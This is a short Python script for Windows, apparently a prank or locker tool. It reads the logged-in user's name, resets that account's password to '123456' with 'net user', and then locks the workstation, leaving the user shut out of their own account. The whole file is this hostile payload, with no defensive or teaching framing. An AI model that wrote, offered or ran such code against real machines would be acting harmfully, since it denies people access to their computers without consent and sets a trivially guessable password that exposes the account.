import subprocess
import os

#Gets User Name
user_name = os.getlogin()
#Changes user password
process = subprocess.run(["net","user",user_name,"123456"])
#Locks the window
process = subprocess.run(["Rundll32.exe","user32.dll,LockWorkStation"])




